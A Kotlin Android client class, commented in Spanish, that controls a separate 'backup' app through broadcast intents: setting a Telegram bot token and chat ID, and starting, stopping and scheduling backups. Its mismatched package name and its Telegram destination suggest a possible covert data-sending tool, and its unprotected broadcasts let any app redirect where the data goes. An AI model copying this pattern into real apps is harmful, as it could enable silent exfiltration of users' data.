package com.service.assasinscreed02

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

/**
 * Cliente para controlar la aplicación de backup desde otras apps
 * 
 * Ejemplo de uso:
 * ```
 * val client = BackupClient(context)
 * 
 * // Configurar el bot
 * client.setConfig("tu_token", "tu_chat_id")
 * 
 * // Iniciar backup
 * client.startBackup(24) // cada 24 horas
 * 
 * // Obtener estado
 * val status = client.getStatus()
 * 
 * // Detener backup
 * client.stopBackup()
 * ```
 */
class BackupClient(private val context: Context) {
    companion object {
        private const val TAG = "BackupClient"
    }
    
    private var responseReceiver: BroadcastReceiver? = null
    private var lastResponse: Response? = null
    
    data class Response(
        val success: Boolean,
        val message: String,
        val action: String
    )
    
    /**
     * Configura el bot de Telegram
     */
    fun setConfig(token: String, chatId: String): Response {
        val intent = Intent(BackupController.ACTION_SET_CONFIG).apply {
            putExtra("bot_token", token)
            putExtra("chat_id", chatId)
        }
        return sendIntent(intent)
    }
    
    /**
     * Inicia el backup automático
     * @param intervalHours Intervalo en horas (mínimo 1)
     */
    fun startBackup(intervalHours: Int = 24): Response {
        val intent = Intent(BackupController.ACTION_START_BACKUP).apply {
            putExtra("interval_hours", intervalHours)
        }
        return sendIntent(intent)
    }
    
    /**
     * Detiene el backup automático
     */
    fun stopBackup(): Response {
        val intent = Intent(BackupController.ACTION_STOP_BACKUP)
        return sendIntent(intent)
    }
    
    /**
     * Obtiene el estado actual del backup
     */
    fun getStatus(): Response {
        val intent = Intent(BackupController.ACTION_GET_STATUS)
        return sendIntent(intent)
    }
    
    /**
     * Configura el intervalo del backup
     * @param intervalHours Intervalo en horas (mínimo 1)
     */
    fun setInterval(intervalHours: Int): Response {
        val intent = Intent(BackupController.ACTION_SET_INTERVAL).apply {
            putExtra("interval_hours", intervalHours)
        }
        return sendIntent(intent)
    }
    
    /**
     * Envía un intent y espera la respuesta
     */
    private fun sendIntent(intent: Intent): Response {
        try {
            // Registrar receiver para la respuesta
            registerResponseReceiver()
            
            // Enviar intent
            context.sendBroadcast(intent)
            
            // Esperar respuesta (máximo 5 segundos)
            var attempts = 0
            while (lastResponse == null && attempts < 50) {
                Thread.sleep(100)
                attempts++
            }
            
            val response = lastResponse ?: Response(false, "Timeout esperando respuesta", intent.action ?: "")
            lastResponse = null
            
            return response
            
        } catch (e: Exception) {
            Log.e(TAG, "Error enviando intent: ${e.message}", e)
            return Response(false, "Error: ${e.message}", intent.action ?: "")
        } finally {
            unregisterResponseReceiver()
        }
    }
    
    /**
     * Registra el receiver para recibir respuestas
     */
    private fun registerResponseReceiver() {
        if (responseReceiver == null) {
            responseReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    if (intent?.action == BackupController.ACTION_RESPONSE) {
                        val success = intent.getBooleanExtra(BackupController.EXTRA_SUCCESS, false)
                        val message = intent.getStringExtra(BackupController.EXTRA_MESSAGE) ?: ""
                        val action = intent.getStringExtra(BackupController.EXTRA_RESPONSE) ?: ""
                        
                        lastResponse = Response(success, message, action)
                        Log.d(TAG, "Respuesta recibida: $message")
                    }
                }
            }
            
            val filter = IntentFilter(BackupController.ACTION_RESPONSE)
            context.registerReceiver(responseReceiver, filter)
        }
    }
    
    /**
     * Desregistra el receiver
     */
    private fun unregisterResponseReceiver() {
        responseReceiver?.let {
            try {
                context.unregisterReceiver(it)
            } catch (e: Exception) {
                Log.w(TAG, "Error desregistrando receiver: ${e.message}")
            }
            responseReceiver = null
        }
    }
    
    /**
     * Verifica si la aplicación de backup está disponible
     */
    fun isAvailable(): Boolean {
        return try {
            val intent = Intent(BackupController.ACTION_GET_STATUS)
            context.sendBroadcast(intent)
            true
        } catch (e: Exception) {
            false
        }
    }
    
    /**
     * Obtiene información de la aplicación
     */
    fun getAppInfo(): String {
        return """
            Radio2 Backup App
            Versión: 1.0
            Disponible: ${isAvailable()}
            
            Acciones disponibles:
            - START_BACKUP: Iniciar backup automático
            - STOP_BACKUP: Detener backup automático
            - GET_STATUS: Obtener estado actual
            - SET_INTERVAL: Configurar intervalo
            - SET_CONFIG: Configurar bot de Telegram
        """.trimIndent()
    }
} 